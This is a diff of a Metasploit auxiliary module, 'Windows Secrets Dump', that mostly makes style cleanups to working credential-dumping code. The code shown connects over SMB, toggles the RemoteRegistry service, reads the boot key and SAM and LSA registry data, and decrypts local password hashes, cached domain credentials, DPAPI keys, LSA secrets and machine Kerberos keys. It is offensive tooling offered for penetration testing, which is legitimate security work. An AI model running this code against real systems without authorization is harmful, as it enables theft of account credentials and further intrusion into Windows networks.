@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/util/windows_registry_parser'
 require 'metasploit/framework/hashes/identify'
 
 class MetasploitModule < Msf::Auxiliary
@@ -16,12 +15,12 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'        => 'Windows Secrets Dump',
-        'Description' => %q(
+        'Name' => 'Windows Secrets Dump',
+        'Description' => %q{
           Dumps SAM hashes and LSA secrets (including cached creds) from the
           remote Windows target without executing any agent locally. First, it
           reads as much data as possible from the registry and then save the
-          hives locally on the target (%SYSTEMROOT%\\random.tmp). Finally, it
+          hives locally on the target (%SYSTEMROOT%\random.tmp). Finally, it
           downloads the temporary hive files and reads the rest of the data
           from it. This temporary files are removed when it's done.
 
@@ -32,21 +31,21 @@ class MetasploitModule < Msf::Auxiliary
           This is a port of the great Impacket `secretsdump.py` code written by
           Alberto Solino. Note that the `NTDS.dit` technique has not been
           implement yet. It will be done in a next iteration.
-        ),
-        'License'     => MSF_LICENSE,
-        'Author'      =>
+        },
+        'License' => MSF_LICENSE,
+        'Author' =>
         [
           'Alberto Solino', # Original Impacket code
           'Christophe De La Fuente', # MSf module
         ],
-        'References'  =>
+        'References' =>
         [
           ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
         ]
       )
     )
 
-    register_options( [ Opt::RPORT(445) ] )
+    register_options([ Opt::RPORT(445) ])
 
     @service_should_be_stopped = false
     @service_should_be_disabled = false
@@ -72,25 +71,25 @@ class MetasploitModule < Msf::Auxiliary
     string   :enc_hash, length: 16
     string   :unknown, length: 56
     string16 :username, length: -> { user_name_length }
-    string   :pad1, length: -> { pad_length(self.username) }
+    string   :pad1, length: -> { pad_length(username) }
     string16 :domain_name, length: -> { domain_name_length }
-    string   :pad2, length: -> { pad_length(self.domain_name) }
+    string   :pad2, length: -> { pad_length(domain_name) }
     string16 :dns_domain_name, length: -> { dns_domain_name_length }
-    string   :pad3, length: -> { pad_length(self.dns_domain_name) }
+    string   :pad3, length: -> { pad_length(dns_domain_name) }
     string16 :upn, length: -> { upn_length }
-    string   :pad4, length: -> { pad_length(self.upn) }
+    string   :pad4, length: -> { pad_length(upn) }
     string16 :effective_name, length: -> { effective_name_length }
-    string   :pad5, length: -> { pad_length(self.effective_name) }
+    string   :pad5, length: -> { pad_length(effective_name) }
     string16 :full_name, length: -> { full_name_length }
-    string   :pad6, length: -> { pad_length(self.full_name) }
+    string   :pad6, length: -> { pad_length(full_name) }
     string16 :logon_script, length: -> { logon_script_length }
-    string   :pad7, length: -> { pad_length(self.logon_script) }
+    string   :pad7, length: -> { pad_length(logon_script) }
     string16 :profile_path, length: -> { profile_path_length }
-    string   :pad8, length: -> { pad_length(self.profile_path) }
+    string   :pad8, length: -> { pad_length(profile_path) }
     string16 :home_directory, length: -> { home_directory_length }
-    string   :pad9, length: -> { pad_length(self.home_directory) }
+    string   :pad9, length: -> { pad_length(home_directory) }
     string16 :home_directory_drive, length: -> { home_directory_drive_length }
-    string   :pad10, length: -> { pad_length(self.home_directory_drive) }
+    string   :pad10, length: -> { pad_length(home_directory_drive) }
     array    :groups, initial_length: -> { group_count } do
       uint32 :relative_id
       uint32 :attributes
@@ -167,7 +166,7 @@ class MetasploitModule < Msf::Auxiliary
     root_key_handle = @winreg.open_root_key('HKLM')
 
     boot_key = ''.b
-    ['JD','Skew1','GBG','Data'].each do |key|
+    ['JD', 'Skew1', 'GBG', 'Data'].each do |key|
       sub_key = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\#{key}"
       vprint_status("Retrieving class info for #{sub_key}")
       subkey_handle = @winreg.open_key(root_key_handle, sub_key)
@@ -263,7 +262,7 @@ class MetasploitModule < Msf::Auxiliary
       hash.update(value_data[0x70, 16] + qwerty + boot_key + digits)
       rc4 = OpenSSL::Cipher.new('rc4')
       rc4.key = hash.digest
-      hboot_key  = rc4.update(value_data[0x80, 32])
+      hboot_key = rc4.update(value_data[0x80, 32])
       hboot_key << rc4.final
       hboot_key
     when 2
@@ -282,12 +281,14 @@ class MetasploitModule < Msf::Auxiliary
   def enum_key(reg_parser, key)
     parent_key = reg_parser.find_key(key)
     return nil unless parent_key
+
     return reg_parser.enum_key(parent_key)
   end
 
   def enum_values(reg_parser, key)
     key_obj = reg_parser.find_key(key)
     return nil unless key_obj
+
     return reg_parser.enum_values(key_obj)
   end
 
@@ -306,6 +307,7 @@ class MetasploitModule < Msf::Auxiliary
         # Attempt to get Hints
         _value_type, value_data = reg_parser.get_value("#{users_key}\\#{rid}", 'UserPasswordHint')
         next unless value_data
+
         users[rid.to_i(16)][:UserPasswordHint] =
           value_data.dup.force_encoding(::Encoding::UTF_16LE).encode(::Encoding::UTF_8).strip
       end
@@ -328,8 +330,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # TODO: use a proper structure for V data, instead of unpacking directly
   def decrypt_user_keys(hboot_key, users)
-    sam_lmpass   = "LMPASSWORD\x00"
-    sam_ntpass   = "NTPASSWORD\x00"
+    sam_lmpass = "LMPASSWORD\x00"
+    sam_ntpass = "NTPASSWORD\x00"
     sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')
     sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')
 
@@ -362,11 +364,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def rid_to_key(rid)
     s1 = [rid].pack('V')
-    s1 << s1[0,3]
+    s1 << s1[0, 3]
 
     s2b = [rid].pack('V').unpack('C4')
     s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')
-    s2 << s2[0,3]
+    s2 << s2[0, 3]
 
     [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
   end
@@ -375,31 +377,31 @@ class MetasploitModule < Msf::Auxiliary
     revision = enc_hash[2, 2]&.unpack('v')&.first
 
     case revision
-      when 1
-        if enc_hash.length < 20
-          return default
-        end
-
-        md5 = Digest::MD5.new
-        md5.update(hboot_key[0,16] + [rid].pack('V') + pass)
-
-        rc4 = OpenSSL::Cipher.new('rc4')
-        rc4.key = md5.digest
-        okey = rc4.update(enc_hash[4, 16])
-      when 2
-        if enc_hash.length < 40
-          return default
-        end
-
-        aes = OpenSSL::Cipher.new('aes-128-cbc')
-        aes.key = hboot_key[0, 16]
-        aes.padding = 0
-        aes.decrypt
-        aes.iv = enc_hash[8, 16]
-        okey = aes.update(enc_hash[24, 16]) # we need only 16 bytes
-      else
-        print_error("Unknown user hash revision: #{revision}")
+    when 1
+      if enc_hash.length < 20
         return default
+      end
+
+      md5 = Digest::MD5.new
+      md5.update(hboot_key[0, 16] + [rid].pack('V') + pass)
+
+      rc4 = OpenSSL::Cipher.new('rc4')
+      rc4.key = md5.digest
+      okey = rc4.update(enc_hash[4, 16])
+    when 2
+      if enc_hash.length < 40
+        return default
+      end
+
+      aes = OpenSSL::Cipher.new('aes-128-cbc')
+      aes.key = hboot_key[0, 16]
+      aes.padding = 0
+      aes.decrypt
+      aes.iv = enc_hash[8, 16]
+      okey = aes.update(enc_hash[24, 16]) # we need only 16 bytes
+    else
+      print_error("Unknown user hash revision: #{revision}")
+      return default
     end
 
     des_k1, des_k2 = rid_to_key(rid)
@@ -412,10 +414,10 @@ class MetasploitModule < Msf::Auxiliary
     d2.padding = 0
     d2.key = des_k2
 
-    d1o  = d1.decrypt.update(okey[0,8])
+    d1o = d1.decrypt.update(okey[0, 8])
     d1o << d1.final
 
-    d2o  = d2.decrypt.update(okey[8,8])
+    d2o = d2.decrypt.update(okey[8, 8])
     d1o << d2.final
     d1o + d2o
   end
@@ -439,7 +441,7 @@ class MetasploitModule < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
     credential_data = {
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: hash,
       private_type: type,
@@ -477,19 +479,19 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Password hints:')
     hint_count = 0
-    users.keys.sort{ |a,b| a <=> b }.each do |rid|
+    users.keys.sort { |a, b| a <=> b }.each do |rid|
       # If we have a hint then print it
-      if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
-        hint = "#{users[rid][:Name]}: \"#{users[rid][:UserPasswordHint]}\""
-        report_info(hint, 'user.password_hint')
-        print_line(hint)
-        hint_count += 1
-      end
+      next unless !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?
+
+      hint = "#{users[rid][:Name]}: \"#{users[rid][:UserPasswordHint]}\""
+      report_info(hint, 'user.password_hint')
+      print_line(hint)
+      hint_count += 1
     end
     print_line('No users with password hints on this system') if hint_count == 0
 
     print_status('Password hashes (pwdump format - uid:rid:lmhash:nthash:::):')
-    users.keys.sort{ |a,b| a <=> b }.each do |rid|
+    users.keys.sort { |a, b| a <=> b }.each do |rid|
       hash = "#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}"
       unless report_creds(users[rid][:Name], hash)
         vprint_bad("Error when reporting #{users[rid][:Name]} hash")
@@ -506,7 +508,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status('Vista or above system')
 
       lsa_key = decrypt_lsa_data(value_data, boot_key)
-      lsa_key = lsa_key[68,32] unless lsa_key.empty?
+      lsa_key = lsa_key[68, 32] unless lsa_key.empty?
     else
       vprint_status('Getting PolSecretEncryptionKey...')
       _value_type, value_data = reg_parser.get_value('\\Policy\\PolSecretEncryptionKey')
@@ -516,15 +518,15 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status('XP or below system')
       @lsa_vista_style = false
 
-      md5x = Digest::MD5.new()
+      md5x = Digest::MD5.new
       md5x << boot_key
-      (1..1000).each do
-        md5x << value_data[60,16]
+      1000.times do
+        md5x << value_data[60, 16]
       end
 
       rc4 = OpenSSL::Cipher.new('rc4')
       rc4.key = md5x.digest
-      lsa_key  = rc4.update(value_data[12,48])
+      lsa_key = rc4.update(value_data[12, 48])
       lsa_key << rc4.final
       lsa_key = lsa_key[0x10..0x1F]
     end
@@ -541,7 +543,7 @@ class MetasploitModule < Msf::Auxiliary
     if lsa_vista_style?
       nlkm_dec = decrypt_lsa_data(value_data, lsa_key)
     else
-      value_data_size = value_data[0,4].unpack('<L').first
+      value_data_size = value_data[0, 4].unpack('<L').first
       nlkm_dec = decrypt_secret_data(value_data[(value_data.size - value_data_size)..-1], lsa_key)
     end
 
@@ -557,7 +559,7 @@ class MetasploitModule < Msf::Auxiliary
 
     decrypted = ''
     (0...edata.length).step(16) do |i|
-      decrypted << aes.update(edata[i,16])
+      decrypted << aes.update(edata[i, 16])
     end
 
     return decrypted
@@ -567,7 +569,7 @@ class MetasploitModule < Msf::Auxiliary
     rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), nlkm, iv)
     rc4 = OpenSSL::Cipher.new('rc4')
     rc4.key = rc4key
-    decrypted  = rc4.update(edata)
+    decrypted = rc4.update(edata)
     decrypted << rc4.final
 
     return decrypted
@@ -600,71 +602,71 @@ class MetasploitModule < Msf::Auxiliary
 
       cache = CacheEntry.read(nl)
 
-      if ( cache.user_name_length > 0 )
-        vprint_status("Reg entry: #{nl.unpack('H*')[0]}")
-        vprint_status("Encrypted data: #{cache.enc_data.to_hex}")
-        vprint_status("IV:  #{cache.iv.to_hex}")
+      next unless (cache.user_name_length > 0)
 
-        enc_data = cache.enc_data.map {|e| e.chr}.join
-        if lsa_vista_style?
-          dec_data = decrypt_hash_vista(enc_data, nlkm_key, cache.iv)
-        else
-          dec_data = decrypt_hash(enc_data, nlkm_key, cache.iv)
-        end
+      vprint_status("Reg entry: #{nl.unpack('H*')[0]}")
+      vprint_status("Encrypted data: #{cache.enc_data.to_hex}")
+      vprint_status("IV:  #{cache.iv.to_hex}")
 
-        vprint_status("Decrypted data: #{dec_data.unpack('H*')[0]}")
-
-        params = cache.snapshot.to_h.select { |key, _v| key.to_s.end_with?('_length') }
-        params[:group_count] = cache.group_count
-        cache_data = CacheData.new(params).read(dec_data)
-        username = cache_data.username.encode(::Encoding::UTF_8)
-        if iteration_count.nil? && lsa_vista_style?
-          if (cache.iteration_count > 10240)
-            iteration_count = cache.iteration_count & 0xfffffc00
-          else
-            iteration_count = cache.iteration_count * 1024
-          end
-        end
-        info = []
-        info << ("Username: #{username}")
-        if iteration_count
-          info << ("Iteration count: #{cache.iteration_count} -> real #{iteration_count}")
-        end
-        info << ("Last login: #{cache.last_access.to_time}")
-        dns_domain_name = cache_data.dns_domain_name.encode(::Encoding::UTF_8)
-        info << ("DNS Domain Name: #{dns_domain_name}")
-        info << ("UPN: #{cache_data.upn.encode(::Encoding::UTF_8)}")
-        info << ("Effective Name: #{cache_data.effective_name.encode(::Encoding::UTF_8)}")
-        info << ("Full Name: #{cache_data.full_name.encode(::Encoding::UTF_8)}")
-        info << ("Logon Script: #{cache_data.logon_script.encode(::Encoding::UTF_8)}")
-        info << ("Profile Path: #{cache_data.profile_path.encode(::Encoding::UTF_8)}")
-        info << ("Home Directory: #{cache_data.home_directory.encode(::Encoding::UTF_8)}")
-        info << ("Home Directory Drive: #{cache_data.home_directory_drive.encode(::Encoding::UTF_8)}")
-        info << ("User ID: #{cache.user_id}")
-        info << ("Primary Group ID: #{cache.primary_group_id}")
-        info << ("Additional groups: #{cache_data.groups.map {|g| g.relative_id}.join(' ')}")
-        logon_domain_name = cache_data.logon_domain_name.encode(::Encoding::UTF_8)
-        info << ("Logon domain name: #{logon_domain_name}")
-
-        report_info(info.join("; "), 'user.cache_info')
-        vprint_line(info.join("\n"))
-
-        credential_opts = {
-          type:        :nonreplayable_hash,
-          realm_key:   Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
-          realm_value: logon_domain_name
-        }
-        if lsa_vista_style?
-          jtr_hash = "$DCC2$#{iteration_count}##{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
-        else
-          jtr_hash = "M$#{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
-        end
-        credential_opts[:jtr_format] = identify_hash(jtr_hash)
-        unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, credential_opts)
-          vprint_bad("Error when reporting #{logon_domain_name}\\#{username} hash (#{credential_opts[:jtr_format]} format)")
-        end
-        hashes << "#{logon_domain_name}\\#{username}:#{jtr_hash}\n"
+      enc_data = cache.enc_data.map(&:chr).join
+      if lsa_vista_style?
+        dec_data = decrypt_hash_vista(enc_data, nlkm_key, cache.iv)
+      else
+        dec_data = decrypt_hash(enc_data, nlkm_key, cache.iv)
       end
+
+      vprint_status("Decrypted data: #{dec_data.unpack('H*')[0]}")
+
+      params = cache.snapshot.to_h.select { |key, _v| key.to_s.end_with?('_length') }
+      params[:group_count] = cache.group_count
+      cache_data = CacheData.new(params).read(dec_data)
+      username = cache_data.username.encode(::Encoding::UTF_8)
+      if iteration_count.nil? && lsa_vista_style?
+        if (cache.iteration_count > 10240)
+          iteration_count = cache.iteration_count & 0xfffffc00
+        else
+          iteration_count = cache.iteration_count * 1024
+        end
+      end
+      info = []
+      info << ("Username: #{username}")
+      if iteration_count
+        info << ("Iteration count: #{cache.iteration_count} -> real #{iteration_count}")
+      end
+      info << ("Last login: #{cache.last_access.to_time}")
+      dns_domain_name = cache_data.dns_domain_name.encode(::Encoding::UTF_8)
+      info << ("DNS Domain Name: #{dns_domain_name}")
+      info << ("UPN: #{cache_data.upn.encode(::Encoding::UTF_8)}")
+      info << ("Effective Name: #{cache_data.effective_name.encode(::Encoding::UTF_8)}")
+      info << ("Full Name: #{cache_data.full_name.encode(::Encoding::UTF_8)}")
+      info << ("Logon Script: #{cache_data.logon_script.encode(::Encoding::UTF_8)}")
+      info << ("Profile Path: #{cache_data.profile_path.encode(::Encoding::UTF_8)}")
+      info << ("Home Directory: #{cache_data.home_directory.encode(::Encoding::UTF_8)}")
+      info << ("Home Directory Drive: #{cache_data.home_directory_drive.encode(::Encoding::UTF_8)}")
+      info << ("User ID: #{cache.user_id}")
+      info << ("Primary Group ID: #{cache.primary_group_id}")
+      info << ("Additional groups: #{cache_data.groups.map(&:relative_id).join(' ')}")
+      logon_domain_name = cache_data.logon_domain_name.encode(::Encoding::UTF_8)
+      info << ("Logon domain name: #{logon_domain_name}")
+
+      report_info(info.join('; '), 'user.cache_info')
+      vprint_line(info.join("\n"))
+
+      credential_opts = {
+        type: :nonreplayable_hash,
+        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_value: logon_domain_name
+      }
+      if lsa_vista_style?
+        jtr_hash = "$DCC2$#{iteration_count}##{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+      else
+        jtr_hash = "M$#{username}##{cache_data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
+      end
+      credential_opts[:jtr_format] = identify_hash(jtr_hash)
+      unless report_creds("#{logon_domain_name}\\#{username}", jtr_hash, credential_opts)
+        vprint_bad("Error when reporting #{logon_domain_name}\\#{username} hash (#{credential_opts[:jtr_format]} format)")
+      end
+      hashes << "#{logon_domain_name}\\#{username}:#{jtr_hash}\n"
     end
 
     if hashes.empty?
@@ -677,10 +679,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_service_account(service_name)
     return nil unless @svcctl
+
     vprint_status("Getting #{service_name} service account")
     svc_handle = @svcctl.open_service_w(@scm_handle, service_name)
     svc_config = @svcctl.query_service_config(svc_handle)
     return nil if svc_config.lp_service_start_name == :null
+
     svc_config.lp_service_start_name.to_s
   rescue RubySMB::Dcerpc::Error::SvcctlError => e
     vprint_warning("An error occured when getting #{service_name} service account: #{e}")
@@ -702,6 +706,7 @@ class MetasploitModule < Msf::Auxiliary
       return nil
     end
     return nil if username.nil? || username.empty?
+
     username = username.encode(::Encoding::UTF_8)
 
     begin
@@ -722,6 +727,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_machine_kerberos_salt
     host = simple.client.default_name
     return ''.b if host.nil? || host.empty?
+
     domain = simple.client.dns_domain_name
     "#{domain.upcase}host#{host.downcase}.#{domain.downcase}".b
   end
@@ -738,16 +744,16 @@ class MetasploitModule < Msf::Auxiliary
 
   def fix_parity(byte_str)
     byte_str.map do |byte|
-      t = byte.to_s(2).rjust(8,'0')
-      if t[0,7].count('1').odd?
-        (t[0,7] + '0').to_i(2).chr
+      t = byte.to_s(2).rjust(8, '0')
+      if t[0, 7].count('1').odd?
+        ("#{t[0, 7]}0").to_i(2).chr
       else
-        (t[0,7] + '1').to_i(2).chr
+        ("#{t[0, 7]}1").to_i(2).chr
       end
     end
   end
 
-  def is_weak_des_key?(key)
+  def weak_des_key?(key)
     [
       "\x01\x01\x01\x01\x01\x01\x01\x01",
       "\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE",
@@ -782,6 +788,7 @@ class MetasploitModule < Msf::Auxiliary
       ciphertext = cipher.update(plaintext)
       rnd_seed += ciphertext
       break unless rnd_seed.size < cipher.key_len
+
       plaintext = ciphertext
     end
     rnd_seed.unpack('H*')[0]
@@ -789,13 +796,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def des_cbc_md5(raw_secret, salt)
     odd = true
-    tmp_byte_str = [0,0,0,0,0,0,0,0]
+    tmp_byte_str = [0, 0, 0, 0, 0, 0, 0, 0]
     plaintext = raw_secret + salt
-    plaintext = plaintext + "\x00".b * (8 - (plaintext.size % 8))
+    plaintext += "\x00".b * (8 - (plaintext.size % 8))
     plaintext.bytes.each_slice(8) do |block|
       tmp_56 = block.map { |byte| byte & 0b01111111 }
       if !odd
+        # rubocop:disable Style/FormatString
         tmp_56_str = tmp_56.map { |byte| '%07b' % byte }.join
+        # rubocop:enable Style/FormatString
         tmp_56_str.reverse!
         tmp_56 = tmp_56_str.bytes.each_slice(7).map do |bits7|
           bits7.map(&:chr).join.to_i(2)
@@ -805,7 +814,7 @@ class MetasploitModule < Msf::Auxiliary
       tmp_byte_str = tmp_byte_str.zip(tmp_56).map { |a, b| a ^ b }
     end
     tempkey = add_parity(tmp_byte_str).map(&:chr).join
-    if is_weak_des_key?(tempkey)
+    if weak_des_key?(tempkey)
       tempkey[7] = (tempkey[7].ord ^ 0xF0).chr
     end
     cipher = OpenSSL::Cipher.new('DES-CBC')
@@ -814,13 +823,13 @@ class MetasploitModule < Msf::Auxiliary
     cipher.key = tempkey
     chekcsumkey = cipher.update(plaintext)[-8..-1]
     chekcsumkey = fix_parity(chekcsumkey.bytes).map(&:chr).join
-    if is_weak_des_key?(chekcsumkey)
+    if weak_des_key?(chekcsumkey)
       chekcsumkey[7] = (chekcsumkey[7].ord ^ 0xF0).chr
     end
     chekcsumkey.unpack('H*')[0]
   end
 
-  def get_machine_kerberos_keys(raw_secret, machine_name)
+  def get_machine_kerberos_keys(raw_secret, _machine_name)
     vprint_status('Calculating machine account Kerberos keys')
     # Attempt to create Kerberos keys from machine account (if possible)
     secret = []
@@ -851,7 +860,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     upper_name = name.upcase
-    print_line("#{name}")
+    print_line(name.to_s)
 
     secret = ''
     if upper_name.start_with?('_SC_')
@@ -876,8 +885,8 @@ class MetasploitModule < Msf::Auxiliary
       secret = "ASPNET: #{secret_item}"
     elsif upper_name.start_with?('DPAPI_SYSTEM')
       # Decode the DPAPI Secrets
-      machine_key = secret_item[4,20]
-      user_key = secret_item[24,20]
+      machine_key = secret_item[4, 20]
+      user_key = secret_item[24, 20]
       report_info(machine_key.unpack('H*')[0], 'dpapi.machine_key')
       report_info(user_key.unpack('H*')[0], 'dpapi.user_key')
       secret = "dpapi_machinekey: 0x#{machine_key.unpack('H*')[0]}\ndpapi_userkey: 0x#{user_key.unpack('H*')[0]}"
@@ -886,10 +895,10 @@ class MetasploitModule < Msf::Auxiliary
       machine = simple.client.default_name
       domain = simple.client.default_domain
       print_name = "#{domain}\\#{machine}$"
-      ntlm_hash = "#{Net::NTLM::lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
+      ntlm_hash = "#{Net::NTLM.lm_hash('').unpack('H*')[0]}:#{md4.unpack('H*')[0]}"
       secret_ary = ["#{print_name}:#{ntlm_hash}:::"]
       credential_opts = {
-        realm_key:   Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
         realm_value: domain
       }
       unless report_creds(print_name, ntlm_hash, credential_opts)
@@ -944,10 +953,10 @@ class MetasploitModule < Msf::Auxiliary
 
       if lsa_vista_style?
         decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
-        secret_size = decrypted[0,4].unpack('<L').first
+        secret_size = decrypted[0, 4].unpack('<L').first
         secret = decrypted[16, secret_size]
       else
-        encrypted_secret_size = encrypted_secret[0,4].unpack('<L').first
+        encrypted_secret_size = encrypted_secret[0, 4].unpack('<L').first
         secret = decrypt_secret_data(encrypted_secret[(encrypted_secret.size - encrypted_secret_size)..-1], lsa_key)
       end
       print_secret(key, secret)
@@ -964,7 +973,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if @service_should_be_disabled
       print_status('Disabling service RemoteRegistry...')
-      @svcctl.change_service_config_w(svc_handle, start_type:  RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)
+      @svcctl.change_service_config_w(svc_handle, start_type: RubySMB::Dcerpc::Svcctl::SERVICE_DISABLED)
     end
   rescue RubySMB::Dcerpc::Error::SvcctlError => e
     vprint_warning("An error occured when cleaning up: #{e}")
@@ -987,41 +996,38 @@ class MetasploitModule < Msf::Auxiliary
     connect
     unless simple.client.is_a?(RubySMB::Client)
       fail_with(Module::Failure::BadConfig,
-        "RubySMB client must be used for this (current client is"\
-        "#{simple.client.class.name}). Make sure 'SMB::ProtocolVersion' advanced"\
-        "option contains at least one SMB version greater then SMBv1 (e.g. "\
-        "'set SMB::ProtocolVersion 1,2,3')."
-      )
+                'RubySMB client must be used for this (current client is'\
+                "#{simple.client.class.name}). Make sure 'SMB::ProtocolVersion' advanced"\
+                'option contains at least one SMB version greater then SMBv1 (e.g. '\
+                "'set SMB::ProtocolVersion 1,2,3').")
     end
     begin
       smb_login
     rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
       fail_with(Module::Failure::NoAccess,
-        "Unable to authenticate ([#{e.class}] #{e})."
-      )
+                "Unable to authenticate ([#{e.class}] #{e}).")
     end
-    mdm_service = report_service(
+    report_service(
       host: rhost,
       port: rport,
       host_name: simple.client.default_name,
       proto: 'tcp',
       name: 'smb',
-      info: "Module: #{self.fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
+      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
     )
 
     begin
       @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
     rescue RubySMB::Error::RubySMBError => e
       fail_with(Module::Failure::Unreachable,
-        "Unable to connect to the remote IPC$ share ([#{e.class}] #{e})."
-      )
+                "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
     end
 
     begin
       @scm_handle = open_sc_manager
     rescue RubySMB::Error::RubySMBError => e
       print_error(
-        "Unable to connect to the remote Service Control Manager. It will fail "\
+        'Unable to connect to the remote Service Control Manager. It will fail '\
         "if the 'RemoteRegistry' service is stopped or disabled ([#{e.class}] #{e})."
       )
     end
@@ -1040,8 +1046,7 @@ class MetasploitModule < Msf::Auxiliary
       @winreg.bind(endpoint: RubySMB::Dcerpc::Winreg)
     rescue RubySMB::Error::RubySMBError => e
       fail_with(Module::Failure::Unreachable,
-        "Error when connecting to 'winreg' interface ([#{e.class}] #{e})."
-      )
+                "Error when connecting to 'winreg' interface ([#{e.class}] #{e}).")
     end
 
     begin
@@ -1097,7 +1102,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Module::Failure::UnexpectedReply, "[#{e.class}] #{e}")
   rescue Rex::ConnectionError => e
     fail_with(Module::Failure::Unreachable, "[#{e.class}] #{e}")
-  rescue ::Exception => e
+  rescue ::StandardError => e
     do_cleanup
     raise e
   ensure
@@ -1107,8 +1112,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     @winreg.close if @winreg
     @tree.disconnect! if @tree
-    simple.client.disconnect! if simple&.client&.is_a?(RubySMB::Client)
+    simple.client.disconnect! if simple&.client.is_a?(RubySMB::Client)
     disconnect
   end
 end
-
